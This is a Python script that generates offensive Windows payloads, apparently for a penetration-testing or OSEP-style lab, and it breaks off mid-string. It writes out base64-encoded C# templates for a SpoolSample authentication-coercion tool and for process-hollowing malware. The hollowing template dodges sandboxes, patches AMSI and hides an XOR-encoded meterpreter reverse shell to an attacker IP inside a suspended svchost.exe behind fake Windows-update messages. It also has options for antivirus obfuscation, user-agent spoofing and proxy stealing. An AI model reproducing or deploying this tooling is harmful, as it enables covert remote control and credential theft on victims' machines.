import os,sys
import base64
import argparse
from random import choice
from makehtml import copy
from makerunner import runner,gen,powershell_b64encode,makeoneliner
from makerunspace import certutil_b64encode
from makedll import xor_buffer_csharp
from makefodhelper import makefodhelper,chararray
from makepipepipe import makepipepipe
from makeminidump import makeminidump

custom_agent = "1" #"0" #"1" #will make cradle pretty long - makes defender suspicious
#agent_string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 Edg/94.0.992.38"
agent_string = "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko"

proxy_kill = "0" #"0" #"1" #cannot coexist with proxy_steal
proxy_steal = "0" #"0" #"1" #requires admin priv, most likely to use for bitsadmin in system shell #bits proxy not tested to work :()

# proxy-safe - if both "1", choose proxy_kill
if proxy_kill == "1" and proxy_steal == "1":
    proxy_steal = "0"
if proxy_kill == "1":
    proxy_steal = "0"
if proxy_steal == "1":
    proxy_kill = "0"

obfuscate_bin = "1" #"0" #"1"

pipename = "\\\\.\\pipe\\test\\pipe\\spoolss"

devhost = "192.168.135.7" #important! distinct from lhost!

def rand_word():
    lines = open('words.txt').read().splitlines()
    string1 = choice(lines)
    string2 = choice(lines)
    string3 = choice(lines)
    res = string1 + string2 + string3
    res = res.capitalize()
    return res

def writespoolsample(targethost,listenpipe):
    csfilepath = "/home/kali/data/SpoolSample/SpoolSample/"
    spoolsamplefilename = "SpoolSample.cs"

    upper = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uVGV4dDsKdXNpbmcgUkRJOwoKbmFtZXNwYWNlIFNwb29sU2FtcGxlCnsKICAgIGNsYXNzIFNwb29sU2FtcGxlCiAgICB7CiAgICAgICAgLy8gRllJLCB0aGVyZSBtaWdodCBiZSByZWxpYWJpbGl0eSBpc3N1ZXMgd2l0aCB0aGlzLiBUaGUgTVMtUlBSTiBwcm9qZWN0IGlzIG1vcmUgcmVsaWFibGUgCiAgICAgICAgc3RhdGljIHZvaWQgTWFpbihzdHJpbmdbXSBhcmdzKQogICAgICAgIHsKICAgICAgICAgICAgLy9pZiAoYXJncy5MZW5ndGggIT0gMikKICAgICAgICAgICAgLy97CiAgICAgICAgICAgIC8vICAgIENvbnNvbGUuV3JpdGVMaW5lKCJJbnZhbGlkIG51bWJlciBvZiBhcmdzLiBTeW50YXg6IFNwb29sU2FtcGxlLmV4ZSBUQVJHRVQgQ0FQVFVSRVNFUlZFUiIpOwogICAgICAgICAgICAvLyAgICByZXR1cm47CiAgICAgICAgICAgIC8vfQ=="
    lower = "ICAgICAgICAgICAgUkRJTG9hZGVyLkNhbGxFeHBvcnRlZEZ1bmN0aW9uKERhdGEuUnBybkRsbCwgIkRvU3R1ZmYiLCBjb21tYW5kQnl0ZXMpOwogICAgICAgIH0KICAgIH0KfQ=="

    data = "byte[] commandBytes = Encoding.Unicode.GetBytes($\"\\\\\\\\%s \\\\\\\\%s\");" % (targethost,listenpipe)

    with open(spoolsamplefilename,'w') as f:
        upper = base64.b64decode(upper).decode()
        lower = base64.b64decode(lower).decode()
        f.write(upper + "\n")
        f.write("            " + data + "\n")
        f.write(lower)
    f.close()

    print('[+] spoolsample cs written: %s' % spoolsamplefilename)
    return spoolsamplefilename 

def makespoolsample(targethost,listenpipe):
    spoolsamplefilename = writespoolsample(targethost,listenpipe)
    csfilepath = "/home/kali/data/SpoolSample/SpoolSample/"
    csfilename = "SpoolSample.cs"
    exewebroot = "/var/www/html/"
    exefilename = "SpoolSample.exe"

    copy(spoolsamplefilename,csfilepath,csfilename)
    input("[!] build %s%s with bitness %s .. press enter to continue\n" % (csfilepath,csfilename,bitness))
    copy("%sbin/Release/%s" % (csfilepath,exefilename),exewebroot,exefilename)
    pass

def writehollow(bitness,lhost,lport):
    csfilepath = "/home/kali/data/Hollow/Hollow/"
    hollowfilename = "Hollow.cs"

    upper = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CnVzaW5nIFN5c3RlbS5OZXQ7CgpuYW1lc3BhY2UgSG9sbG93CnsKICAgIHB1YmxpYyBjbGFzcyBQcm9ncmFtCiAgICB7CiAgICAgICAgcHVibGljIGNvbnN0IHVpbnQgQ1JFQVRFX1NVU1BFTkRFRCA9IDB4NDsKICAgICAgICBwdWJsaWMgY29uc3QgaW50IFBST0NFU1NCQVNJQ0lORk9STUFUSU9OID0gMDsKCiAgICAgICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8pXQogICAgICAgIHB1YmxpYyBzdHJ1Y3QgUHJvY2Vzc0luZm8KICAgICAgICB7CiAgICAgICAgICAgIHB1YmxpYyBJbnRQdHIgaFByb2Nlc3M7CiAgICAgICAgICAgIHB1YmxpYyBJbnRQdHIgaFRocmVhZDsKICAgICAgICAgICAgcHVibGljIEludDMyIFByb2Nlc3NJZDsKICAgICAgICAgICAgcHVibGljIEludDMyIFRocmVhZElkOwogICAgICAgIH0KCiAgICAgICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8pXQogICAgICAgIHB1YmxpYyBzdHJ1Y3QgU3RhcnR1cEluZm8KICAgICAgICB7CiAgICAgICAgICAgIHB1YmxpYyB1aW50IGNiOwogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGxwUmVzZXJ2ZWQ7CiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgbHBEZXNrdG9wOwogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGxwVGl0bGU7CiAgICAgICAgICAgIHB1YmxpYyB1aW50IGR3WDsKICAgICAgICAgICAgcHVibGljIHVpbnQgZHdZOwogICAgICAgICAgICBwdWJsaWMgdWludCBkd1hTaXplOwogICAgICAgICAgICBwdWJsaWMgdWludCBkd1lTaXplOwogICAgICAgICAgICBwdWJsaWMgdWludCBkd1hDb3VudENoYXJzOwogICAgICAgICAgICBwdWJsaWMgdWludCBkd1lDb3VudENoYXJzOwogICAgICAgICAgICBwdWJsaWMgdWludCBkd0ZpbGxBdHRyaWJ1dGU7CiAgICAgICAgICAgIHB1YmxpYyB1aW50IGR3RmxhZ3M7CiAgICAgICAgICAgIHB1YmxpYyBzaG9ydCB3U2hvd1dpbmRvdzsKICAgICAgICAgICAgcHVibGljIHNob3J0IGNiUmVzZXJ2ZWQyOwogICAgICAgICAgICBwdWJsaWMgSW50UHRyIGxwUmVzZXJ2ZWQyOwogICAgICAgICAgICBwdWJsaWMgSW50UHRyIGhTdGRJbnB1dDsKICAgICAgICAgICAgcHVibGljIEludFB0ciBoU3RkT3V0cHV0OwogICAgICAgICAgICBwdWJsaWMgSW50UHRyIGhTdGRFcnJvcjsKICAgICAgICB9CgogICAgICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsKV0KICAgICAgICBpbnRlcm5hbCBzdHJ1Y3QgUHJvY2Vzc0Jhc2ljSW5mbwogICAgICAgIHsKICAgICAgICAgICAgcHVibGljIEludFB0ciBSZXNlcnZlZDE7CiAgICAgICAgICAgIHB1YmxpYyBJbnRQdHIgUGViQWRkcmVzczsKICAgICAgICAgICAgcHVibGljIEludFB0ciBSZXNlcnZlZDI7CiAgICAgICAgICAgIHB1YmxpYyBJbnRQdHIgUmVzZXJ2ZWQzOwogICAgICAgICAgICBwdWJsaWMgSW50UHRyIFVuaXF1ZVBpZDsKICAgICAgICAgICAgcHVibGljIEludFB0ciBNb3JlUmVzZXJ2ZWQ7CiAgICAgICAgfQoKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0KICAgICAgICBzdGF0aWMgZXh0ZXJuIHZvaWQgU2xlZXAodWludCBkd01pbGxpc2Vjb25kcyk7CgogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUsIENoYXJTZXQgPSBDaGFyU2V0LkFuc2kpXQogICAgICAgIHN0YXRpYyBleHRlcm4gYm9vbCBDcmVhdGVQcm9jZXNzKHN0cmluZyBscEFwcGxpY2F0aW9uTmFtZSwgc3RyaW5nIGxwQ29tbWFuZExpbmUsIEludFB0ciBscFByb2Nlc3NBdHRyaWJ1dGVzLAogICAgICAgICAgICBJbnRQdHIgbHBUaHJlYWRBdHRyaWJ1dGVzLCBib29sIGJJbmhlcml0SGFuZGxlcywgdWludCBkd0NyZWF0aW9uRmxhZ3MsIEludFB0ciBscEVudmlyb25tZW50LCBzdHJpbmcgbHBDdXJyZW50RGlyZWN0b3J5LAogICAgICAgICAgICBbSW5dIHJlZiBTdGFydHVwSW5mbyBscFN0YXJ0dXBJbmZvLCBvdXQgUHJvY2Vzc0luZm8gbHBQcm9jZXNzSW5mb3JtYXRpb24pOwoKICAgICAgICBbRGxsSW1wb3J0KCJudGRsbC5kbGwiLCBDYWxsaW5nQ29udmVudGlvbiA9IENhbGxpbmdDb252ZW50aW9uLlN0ZENhbGwpXQogICAgICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBpbnQgWndRdWVyeUluZm9ybWF0aW9uUHJvY2VzcyhJbnRQdHIgaFByb2Nlc3MsIGludCBwcm9jSW5mb3JtYXRpb25DbGFzcywKICAgICAgICAgICAgcmVmIFByb2Nlc3NCYXNpY0luZm8gcHJvY0luZm9ybWF0aW9uLCB1aW50IFByb2NJbmZvTGVuLCByZWYgdWludCByZXRsZW4pOwoKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgICAgICBzdGF0aWMgZXh0ZXJuIGJvb2wgUmVhZFByb2Nlc3NNZW1vcnkoSW50UHRyIGhQcm9jZXNzLCBJbnRQdHIgbHBCYXNlQWRkcmVzcywgW091dF0gYnl0ZVtdIGxwQnVmZmVyLAogICAgICAgICAgICBpbnQgZHdTaXplLCBvdXQgSW50UHRyIGxwTnVtYmVyT2ZieXRlc1JXKTsKCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBXcml0ZVByb2Nlc3NNZW1vcnkoSW50UHRyIGhQcm9jZXNzLCBJbnRQdHIgbHBCYXNlQWRkcmVzcywgYnl0ZVtdIGxwQnVmZmVyLCBJbnQzMiBuU2l6ZSwgb3V0IEludFB0ciBscE51bWJlck9mQnl0ZXNXcml0dGVuKTsKCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICAgICAgc3RhdGljIGV4dGVybiB1aW50IFJlc3VtZVRocmVhZChJbnRQdHIgaFRocmVhZCk7CgogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBWaXJ0dWFsUHJvdGVjdChJbnRQdHIgbHBBZGRyZXNzLCBVSW50MzIgZHdTaXplLCBVSW50MzIgZmxOZXdQcm90ZWN0LCBvdXQgVUludDMyIGxwZmxPbGRQcm90ZWN0KTsKCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgTG9hZExpYnJhcnkoc3RyaW5nIG5hbWUpOwoKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9jQWRkcmVzcyhJbnRQdHIgaE1vZHVsZSwgc3RyaW5nIHByb2NOYW1lKTsKCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSwgRXhhY3RTcGVsbGluZyA9IHRydWUpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBWaXJ0dWFsQWxsb2NFeE51bWEoSW50UHRyIGhQcm9jZXNzLCBJbnRQdHIgbHBBZGRyZXNzLCB1aW50IGR3U2l6ZSwgVUludDMyIGZsQWxsb2NhdGlvblR5cGUsIFVJbnQzMiBmbFByb3RlY3QsIFVJbnQzMiBubmRQcmVmZXJyZWQpOwoKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0KICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0Q3VycmVudFByb2Nlc3MoKTsKICAgICAgICBwdWJsaWMgc3RhdGljIHZvaWQgTWFpbihzdHJpbmdbXSBhcmdzKQogICAgICAgIHsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlByZXBhcmluZyB0byBjb25maWd1cmUgV2luZG93cy4uLiBEbyBub3QgdHVybiBvZmYgeW91ciBjb21wdXRlci4iKTsKICAgICAgICAgICAgSW50UHRyIG1lbSA9IFZpcnR1YWxBbGxvY0V4TnVtYShHZXRDdXJyZW50UHJvY2VzcygpLCBJbnRQdHIuWmVybywgMHgxMDAwLCAweDMwMDAsIDB4NCwgMCk7CiAgICAgICAgICAgIGlmIChtZW0gPT0gbnVsbCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICB9CgogICAgICAgICAgICBEYXRlVGltZSB0MSA9IERhdGVUaW1lLk5vdzsKICAgICAgICAgICAgU2xlZXAoMTAwMDApOwogICAgICAgICAgICBkb3VibGUgZGVsdGFUID0gRGF0ZVRpbWUuTm93LlN1YnRyYWN0KHQxKS5Ub3RhbFNlY29uZHM7CiAgICAgICAgICAgIGlmIChkZWx0YVQgPCA5LjUpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgLy9hbnRpaGV1cjogY29udGFjdCBmYWtlIHVybCBhbmQgc2VlIGlmIHN0YXR1cyBhY3R1YWxseSByZXR1cm5lZCBvawogICAgICAgICAgICBzdHJpbmcgdXJsID0gImh0dHA6Ly93b2x0cmFtYXBsaGEuY29tIjsKICAgICAgICAgICAgLy9zdHJpbmcgdXJsID0gImh0dHBzOi8vZ29vZ2xlLmNvbSI7IC8vdGVzdAogICAgICAgICAgICAvLyBDcmVhdGVzIGFuIEh0dHBXZWJSZXF1ZXN0IGZvciB0aGUgc3BlY2lmaWVkIFVSTC4KICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIEh0dHBXZWJSZXF1ZXN0IG15SHR0cFdlYlJlcXVlc3QgPSAoSHR0cFdlYlJlcXVlc3QpV2ViUmVxdWVzdC5DcmVhdGUodXJsKTsKICAgICAgICAgICAgICAgIC8vIFNlbmRzIHRoZSBIdHRwV2ViUmVxdWVzdCBhbmQgd2FpdHMgZm9yIGEgcmVzcG9uc2UuCiAgICAgICAgICAgICAgICBIdHRwV2ViUmVzcG9uc2UgbXlIdHRwV2ViUmVzcG9uc2UgPSAoSHR0cFdlYlJlc3BvbnNlKW15SHR0cFdlYlJlcXVlc3QuR2V0UmVzcG9uc2UoKTsKICAgICAgICAgICAgICAgIGlmIChteUh0dHBXZWJSZXNwb25zZS5TdGF0dXNDb2RlID09IEh0dHBTdGF0dXNDb2RlLk9LKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIC8vIFJlbGVhc2VzIHRoZSByZXNvdXJjZXMgb2YgdGhlIHJlc3BvbnNlLgogICAgICAgICAgICAgICAgbXlIdHRwV2ViUmVzcG9uc2UuQ2xvc2UoKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiQ29uZmlndXJpbmcgV2luZG93cyB1cGRhdGUuLi4gRG8gbm90IHR1cm4gb2ZmIHlvdXIgY29tcHV0ZXIuIik7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIC8vYW50aWhldXI6IGxvb3AgOTAwIG1pbGxpb24gdGltZXMgYW5kIHNlZSBpZiB0aGUgbG9vcCByZWFsbHkgaGFwcGVuZWQKICAgICAgICAgICAgaW50IGNvdW50ID0gMDsKICAgICAgICAgICAgaW50IG1heCA9IDkwMDAwMDAwMDsKICAgICAgICAgICAgZm9yIChpbnQgaSA9IDA7IGkgPCBtYXg7IGkrKykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgY291bnQrKzsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoY291bnQgIT0gbWF4KQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcnVubmVyKCk7CiAgICAgICAgfQoKICAgICAgICBzdGF0aWMgdm9pZCBydW5uZXIoKQogICAgICAgIHsKICAgICAgICAgICAgLy93cmVjayBtaW1pCiAgICAgICAgICAgIHN0cmluZyBuYW1lMSA9ICJhIiArICJtc2kiICsgIi5kbGwiOwogICAgICAgICAgICBzdHJpbmcgbmFtZTIgPSAiQSIgKyAibXNpIiArICJTY2FuQiIgKyAidWZmZXIiOwogICAgICAgICAgICBJbnRQdHIgVGFyZ2V0RExMID0gTG9hZExpYnJhcnkobmFtZTEpOwogICAgICAgICAgICBJbnRQdHIgTWltaVB0ciA9IEdldFByb2NBZGRyZXNzKFRhcmdldERMTCwgbmFtZTIpOwogICAgICAgICAgICBVSW50MzIgb2xkUHJvdGVjdCA9IDA7CiAgICAgICAgICAgIEJ5dGVbXSBidWZpID0geyAweDQ4LCAweDMxLCAweEMwIH07CiAgICAgICAgICAgIFZpcnR1YWxQcm90ZWN0KE1pbWlQdHIsIDMsIDB4NDAsIG91dCBvbGRQcm90ZWN0KTsKICAgICAgICAgICAgTWFyc2hhbC5Db3B5KGJ1ZmksIDAsIE1pbWlQdHIsIGJ1ZmkuTGVuZ3RoKTsKICAgICAgICAgICAgVmlydHVhbFByb3RlY3QoTWltaVB0ciwgMywgMHgyMCwgb3V0IG9sZFByb3RlY3QpOwoKICAgICAgICAgICAgLy8gbXNmdmVub20gLXAgd2luZG93cy94NjQvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV90Y3AgTEhPU1Q9MTkyLjE2OC4xMzUuNyBMUE9SVD00NDMgRVhJVEZVTkM9dGhyZWFkIC1mIGNzaGFycAogICAgICAgICAgICAvLyBYT1JlZCB3aXRoIGtleSAweGZh"
    lower = "ICAgICAgICAgICAgLy8gU3RhcnQgJ3N2Y2hvc3QuZXhlJyBpbiBhIHN1c3BlbmRlZCBzdGF0ZQogICAgICAgICAgICBTdGFydHVwSW5mbyBzSW5mbyA9IG5ldyBTdGFydHVwSW5mbygpOwogICAgICAgICAgICBQcm9jZXNzSW5mbyBwSW5mbyA9IG5ldyBQcm9jZXNzSW5mbygpOwogICAgICAgICAgICBib29sIGNSZXN1bHQgPSBDcmVhdGVQcm9jZXNzKG51bGwsICJjOlxcd2luZG93c1xcc3lzdGVtMzJcXHN2Y2hvc3QuZXhlIiwgSW50UHRyLlplcm8sIEludFB0ci5aZXJvLAogICAgICAgICAgICAgICAgZmFsc2UsIENSRUFURV9TVVNQRU5ERUQsIEludFB0ci5aZXJvLCBudWxsLCByZWYgc0luZm8sIG91dCBwSW5mbyk7CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCQiU3RhcnRlZCAnc3ZjaG9zdC5leGUnIGluIGEgc3VzcGVuZGVkIHN0YXRlIHdpdGggUElEIHtwSW5mby5Qcm9jZXNzSWR9LiBTdWNjZXNzOiB7Y1Jlc3VsdH0uIik7CgogICAgICAgICAgICAvLyBHZXQgUHJvY2VzcyBFbnZpcm9ubWVudCBCbG9jayAoUEVCKSBtZW1vcnkgYWRkcmVzcyBvZiBzdXNwZW5kZWQgcHJvY2VzcyAob2Zmc2V0IDB4MTAgZnJvbSBiYXNlIGltYWdlKQogICAgICAgICAgICBQcm9jZXNzQmFzaWNJbmZvIHBiSW5mbyA9IG5ldyBQcm9jZXNzQmFzaWNJbmZvKCk7CiAgICAgICAgICAgIHVpbnQgcmV0TGVuID0gbmV3IHVpbnQoKTsKICAgICAgICAgICAgbG9uZyBxUmVzdWx0ID0gWndRdWVyeUluZm9ybWF0aW9uUHJvY2VzcyhwSW5mby5oUHJvY2VzcywgUFJPQ0VTU0JBU0lDSU5GT1JNQVRJT04sIHJlZiBwYkluZm8sICh1aW50KShJbnRQdHIuU2l6ZSAqIDYpLCByZWYgcmV0TGVuKTsKICAgICAgICAgICAgSW50UHRyIGJhc2VJbWFnZUFkZHIgPSAoSW50UHRyKSgoSW50NjQpcGJJbmZvLlBlYkFkZHJlc3MgKyAweDEwKTsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoJCJHb3QgcHJvY2VzcyBpbmZvcm1hdGlvbiBhbmQgbG9jYXRlZCBQRUIgYWRkcmVzcyBvZiBwcm9jZXNzIGF0IHsiMHgiICsgYmFzZUltYWdlQWRkci5Ub1N0cmluZygieCIpfS4gU3VjY2Vzczoge3FSZXN1bHQgPT0gMH0uIik7CgogICAgICAgICAgICAvLyBHZXQgZW50cnkgcG9pbnQgb2YgdGhlIGFjdHVhbCBwcm9jZXNzIGV4ZWN1dGFibGUKICAgICAgICAgICAgLy8gVGhpcyBvbmUgaXMgYSBiaXQgY29tcGxpY2F0ZWQsIGJlY2F1c2UgdGhpcyBhZGRyZXNzIGRpZmZlcnMgZm9yIGVhY2ggcHJvY2VzcyAoZHVlIHRvIEFkZHJlc3MgU3BhY2UgTGF5b3V0IFJhbmRvbWl6YXRpb24gKEFTTFIpKQogICAgICAgICAgICAvLyBGcm9tIHRoZSBQRUIgKGFkZHJlc3Mgd2UgZ290IGluIGxhc3QgY2FsbCksIHdlIGhhdmUgdG8gZG8gdGhlIGZvbGxvd2luZzoKICAgICAgICAgICAgLy8gMS4gUmVhZCBleGVjdXRhYmxlIGFkZHJlc3MgZnJvbSBmaXJzdCA4IGJ5dGVzIChJbnQ2NCwgb2Zmc2V0IDApIG9mIFBFQiBhbmQgcmVhZCBkYXRhIGNodW5rIGZvciBmdXJ0aGVyIHByb2Nlc3NpbmcKICAgICAgICAgICAgLy8gMi4gUmVhZCB0aGUgZmllbGQgJ2VfbGZhbmV3JywgNCBieXRlcyBhdCBvZmZzZXQgMHgzQyBmcm9tIGV4ZWN1dGFibGUgYWRkcmVzcyB0byBnZXQgdGhlIG9mZnNldCBmb3IgdGhlIFBFIGhlYWRlcgogICAgICAgICAgICAvLyAzLiBUYWtlIHRoZSBtZW1vcnkgYXQgdGhpcyBQRSBoZWFkZXIgYWRkIGFuIG9mZnNldCBvZiAweDI4IHRvIGdldCB0aGUgRW50cnlwb2ludCBSZWxhdGl2ZSBWaXJ0dWFsIEFkZHJlc3MgKFJWQSkgb2Zmc2V0CiAgICAgICAgICAgIC8vIDQuIFJlYWQgdGhlIHZhbHVlIGF0IHRoZSBSVkEgb2Zmc2V0IGFkZHJlc3MgdG8gZ2V0IHRoZSBvZmZzZXQgb2YgdGhlIGV4ZWN1dGFibGUgZW50cnlwb2ludCBmcm9tIHRoZSBleGVjdXRhYmxlIGFkZHJlc3MKICAgICAgICAgICAgLy8gNS4gR2V0IHRoZSBhYnNvbHV0ZSBhZGRyZXNzIG9mIHRoZSBlbnRyeXBvaW50IGJ5IGFkZGluZyB0aGlzIHZhbHVlIHRvIHRoZSBiYXNlIGV4ZWN1dGFibGUgYWRkcmVzcy4gU3VjY2VzcyEKCiAgICAgICAgICAgIC8vIDEuIFJlYWQgZXhlY3V0YWJsZSBhZGRyZXNzIGZyb20gZmlyc3QgOCBieXRlcyAoSW50NjQsIG9mZnNldCAwKSBvZiBQRUIgYW5kIHJlYWQgZGF0YSBjaHVuayBmb3IgZnVydGhlciBwcm9jZXNzaW5nCiAgICAgICAgICAgIGJ5dGVbXSBwcm9jQWRkciA9IG5ldyBieXRlWzB4OF07CiAgICAgICAgICAgIGJ5dGVbXSBkYXRhQnVmID0gbmV3IGJ5dGVbMHgyMDBdOwogICAgICAgICAgICBJbnRQdHIgYnl0ZXNSVyA9IG5ldyBJbnRQdHIoKTsKICAgICAgICAgICAgYm9vbCByZXN1bHQgPSBSZWFkUHJvY2Vzc01lbW9yeShwSW5mby5oUHJvY2VzcywgYmFzZUltYWdlQWRkciwgcHJvY0FkZHIsIHByb2NBZGRyLkxlbmd0aCwgb3V0IGJ5dGVzUlcpOwogICAgICAgICAgICBJbnRQdHIgZXhlY3V0YWJsZUFkZHJlc3MgPSAoSW50UHRyKUJpdENvbnZlcnRlci5Ub0ludDY0KHByb2NBZGRyLCAwKTsKICAgICAgICAgICAgcmVzdWx0ID0gUmVhZFByb2Nlc3NNZW1vcnkocEluZm8uaFByb2Nlc3MsIGV4ZWN1dGFibGVBZGRyZXNzLCBkYXRhQnVmLCBkYXRhQnVmLkxlbmd0aCwgb3V0IGJ5dGVzUlcpOwogICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgkIkRFQlVHOiBFeGVjdXRhYmxlIGJhc2UgYWRkcmVzczogeyIweCIgKyBleGVjdXRhYmxlQWRkcmVzcy5Ub1N0cmluZygieCIpfS4iKTsKCiAgICAgICAgICAgIC8vIDIuIFJlYWQgdGhlIGZpZWxkICdlX2xmYW5ldycsIDQgYnl0ZXMgKFVJbnQzMikgYXQgb2Zmc2V0IDB4M0MgZnJvbSBleGVjdXRhYmxlIGFkZHJlc3MgdG8gZ2V0IHRoZSBvZmZzZXQgZm9yIHRoZSBQRSBoZWFkZXIKICAgICAgICAgICAgdWludCBlX2xmYW5ldyA9IEJpdENvbnZlcnRlci5Ub1VJbnQzMihkYXRhQnVmLCAweDNjKTsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoJCJERUJVRzogZV9sZmFuZXcgb2Zmc2V0OiB7IjB4IiArIGVfbGZhbmV3LlRvU3RyaW5nKCJ4Iil9LiIpOwoKICAgICAgICAgICAgLy8gMy4gVGFrZSB0aGUgbWVtb3J5IGF0IHRoaXMgUEUgaGVhZGVyIGFkZCBhbiBvZmZzZXQgb2YgMHgyOCB0byBnZXQgdGhlIEVudHJ5cG9pbnQgUmVsYXRpdmUgVmlydHVhbCBBZGRyZXNzIChSVkEpIG9mZnNldAogICAgICAgICAgICB1aW50IHJ2YU9mZnNldCA9IGVfbGZhbmV3ICsgMHgyODsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoJCJERUJVRzogUlZBIG9mZnNldDogeyIweCIgKyBydmFPZmZzZXQuVG9TdHJpbmcoIngiKX0uIik7CgogICAgICAgICAgICAvLyA0LiBSZWFkIHRoZSA0IGJ5dGVzIChVSW50MzIpIGF0IHRoZSBSVkEgb2Zmc2V0IHRvIGdldCB0aGUgb2Zmc2V0IG9mIHRoZSBleGVjdXRhYmxlIGVudHJ5cG9pbnQgZnJvbSB0aGUgZXhlY3V0YWJsZSBhZGRyZXNzCiAgICAgICAgICAgIHVpbnQgcnZhID0gQml0Q29udmVydGVyLlRvVUludDMyKGRhdGFCdWYsIChpbnQpcnZhT2Zmc2V0KTsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoJCJERUJVRzogUlZBIHZhbHVlOiB7IjB4IiArIHJ2YS5Ub1N0cmluZygieCIpfS4iKTsKCiAgICAgICAgICAgIC8vIDUuIEdldCB0aGUgYWJzb2x1dGUgYWRkcmVzcyBvZiB0aGUgZW50cnlwb2ludCBieSBhZGRpbmcgdGhpcyB2YWx1ZSB0byB0aGUgYmFzZSBleGVjdXRhYmxlIGFkZHJlc3MuIFN1Y2Nlc3MhCiAgICAgICAgICAgIEludFB0ciBlbnRyeXBvaW50QWRkciA9IChJbnRQdHIpKChJbnQ2NClleGVjdXRhYmxlQWRkcmVzcyArIHJ2YSk7CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCQiR290IGV4ZWN1dGFibGUgZW50cnlwb2ludCBhZGRyZXNzOiB7IjB4IiArIGVudHJ5cG9pbnRBZGRyLlRvU3RyaW5nKCJ4Iil9LiIpOwoKICAgICAgICAgICAgLy8gQ2Fycnlpbmcgb24sIGRlY29kZSB0aGUgWE9SIHBheWxvYWQKICAgICAgICAgICAgZm9yIChpbnQgaSA9IDA7IGkgPCBidWYuTGVuZ3RoOyBpKyspCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGJ1ZltpXSA9IChieXRlKSgodWludClidWZbaV0gXiAweGZhKTsKICAgICAgICAgICAgfQogICAgICAgICAgICAvL0NvbnNvbGUuV3JpdGVMaW5lKCJYT1ItZGVjb2RlZCBwYXlsb2FkLiIpOwoKICAgICAgICAgICAgLy8gT3ZlcndyaXRlIHRoZSBtZW1vcnkgYXQgdGhlIGlkZW50aWZpZWQgYWRkcmVzcyB0byAnaGlqYWNrJyB0aGUgZW50cnlwb2ludCBvZiB0aGUgZXhlY3V0YWJsZQogICAgICAgICAgICByZXN1bHQgPSBXcml0ZVByb2Nlc3NNZW1vcnkocEluZm8uaFByb2Nlc3MsIGVudHJ5cG9pbnRBZGRyLCBidWYsIGJ1Zi5MZW5ndGgsIG91dCBieXRlc1JXKTsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoJCJPdmVyd3JvdGUgZW50cnlwb2ludCB3aXRoIHBheWxvYWQuIFN1Y2Nlc3M6IHtyZXN